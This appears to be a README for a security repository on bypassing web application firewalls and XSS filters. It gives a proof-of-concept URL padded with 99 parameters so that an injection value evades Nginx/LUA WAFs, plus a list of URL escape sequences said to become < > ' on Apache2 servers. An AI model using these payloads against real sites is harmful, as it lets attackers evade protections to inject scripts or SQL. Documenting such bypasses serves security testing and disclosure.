# Bypassing-Web-Application-Firewalls-And-XSS-Filters
This repository contains some documented WAF bypass exploits and a series of python scripts for generating weird character combinations and lists for BurpSuite Pro for bypassing web application firewalls (WAF) and XSS filters.

## Nginx/LUA 100 Request Limitation Exploit
*Update October 2018*
As detiled in the recently disclosed Cloudflare vulnerability, several Nginx/LUA based WAF implementations have a limitation where only 100 requests (GET/POST requests) can be processed before the WAF is no longer able to see them.

> “Nginx is a web server that is responsible for processing web requests. It is a stable and versatile tool that allows developers to focus on the implementation of WAF through different scripts written in LUA. Most of these open source WAF’s have the same problem: they don’t take into account that the module responsible for the integration of LUA in Nginx (lua-nginx-module) doesn’t allow access to all the information of a request.”

> ngx.req.get_uri_args()
some note from https://github.com/openresty/lua-nginx-module#ngxreqget_uri_args
“Note that a maximum of 100 request arguments are parsed by default (including those with the same name) and that additional request arguments are silently discarded to guard against potential denial of service attacks.”

Proof of concept 100 request parameters for WAF bypass exploit:
```
/test.php?&a0=0&a1=1&a2=2&a3=3&a4=4&a5=5&a6=6&a7=7&a8=8&a9=9&a10=10&a11=11&a12=12&a13=13&a14=14&a15=15&a16=16&a17=17&a18=18&a19=19&a20=20&a21=21&a22=22&a23=23&a24=24&a25=25&a26=26&a27=27&a28=28&a29=29&a30=30&a31=31&a32=32&a33=33&a34=34&a35=35&a36=36&a37=37&a38=38&a39=39&a40=40&a41=41&a42=42&a43=43&a44=44&a45=45&a46=46&a47=47&a48=48&a49=49&a50=50&a51=51&a52=52&a53=53&a54=54&a55=55&a56=56&a57=57&a58=58&a59=59&a60=60&a61=61&a62=62&a63=63&a64=64&a65=65&a66=66&a67=67&a68=68&a69=69&a70=70&a71=71&a72=72&a73=73&a74=74&a75=75&a76=76&a77=77&a78=78&a79=79&a80=80&a81=81&a82=82&a83=83&a84=84&a85=85&a86=86&a87=87&a88=88&a89=89&a90=90&a91=91&a92=92&a93=93&a94=94&a95=95&a96=96&a97=97&a98=98&a=information_schemas
```


References:
https://github.com/p0pr0ck5/lua-resty-waf/issues/280
https://latesthackingnews.com/2018/10/26/cloudflare-waf-bypass-vulnerability-discovered/

## WAF Funky Characters Testing
These python scripts have been created to fuzz wierd combinations:

 * URL Escape Characters 
 * HTML Escape Characters
 * Binary Characters
 
These scripts were created during an assessment, while trying to bypass a Web Application Firewall (WAF) in order to exploit a XSS vulnerability.
Differnt webservers and browsers interpret URL and strange characters differently which could lead to the bypassing of security controls.
When I tried to send a > or < character the WAF would block the request.

The following URL escapes I have noticed are traslated to < > ' by Apache2 based web servers / WAF applications:

%(N%(n%)S%)U%)^%)s%)u%*C%*E%*c%*e%,.%.#%1N%1n%2S%2U%2^%2s%2u%3C%3E%3c%3e%5.%7#%:C%:E
%:c%:e%HN%Hn%IS%IU%I^%Is%Iu%JC%JE%Jc%Je%L.%N#%XN%Xn%YS%YU%Y^%Ys%Yu%ZC%ZE%Zc%Ze%\.%^#
%hN%hn%iS%iU%i^%is%iu%jC%jE%jc%je%l.%n#%xN%xn%yS%yU%y^%ys%yu%zC%zE%zc%ze%|.


